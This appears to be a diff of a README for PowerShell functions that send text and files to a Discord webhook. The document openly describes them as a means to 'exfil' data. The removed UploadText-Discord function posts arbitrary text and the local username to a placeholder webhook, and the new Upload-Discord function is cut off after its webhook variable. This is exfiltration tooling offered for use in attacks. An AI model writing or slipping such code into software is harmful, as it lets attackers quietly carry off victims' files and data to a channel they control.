@@ -23,70 +23,28 @@
 
 ## Description
 
-These functions are used to upload either text or other files to your discord via a webhook 
+This function is used to upload either text or other files to your discord via a webhook 
 
 ## The Functions
 
-### [UploadText-Discord] 
 
-This function is used to exfil text to your discord. Can be written out or stored in a variable.
-
-Just replace `$hookurl` with YOUR discord webhook
-
-```
-function UploadText-Discord {
-
-  [CmdletBinding()]
-  param (    
-  [Parameter (Position=0,Mandatory = $True)]
-  [string]$text
-  ) 
-  
-  $hookUrl = 'YOUR-DISCORD-WEBHOOK'
-  
-$Body = @{
-  'username' = $env:username
-  'content' = $text
-}
-
-Invoke-RestMethod -Uri $hookUrl -Method 'post' -Body $Body
-}
-```
-----------------------------------------------------------------------------------------------------------------------------------
-### [Syntax]
-
-```
-UploadText-Discord -text "Text to exfil"
-
-or
-
-UploadText-Discord "Text to exfil"
-
-or
-
-UploadText-Discord $variable
-```
-
-----------------------------------------------------------------------------------------------------------------------------------
-
-### [UploadFile-Discord] 
+### [Upload-Discord] 
 
 This function is used to upload files to your discord. 
 
 Just replace `$hookurl` with YOUR discord webhook
 
-The `$text` parameter is optional
+Now you can use either of the  `$text` or `$file` parameter or both 
 
 ```
-function UploadFile-Discord {
+function Upload-Discord {
 
 [CmdletBinding()]
 param (
-
-    [parameter(Position=0,Mandatory=$True)]
+    [parameter(Position=0,Mandatory=$False)]
     [string]$file,
     [parameter(Position=1,Mandatory=$False)]
-    [string]$text = 'file uploaded'
+    [string]$text 
 )
 
 $hookurl = 'YOUR-DISCORD-WEBHOOK'
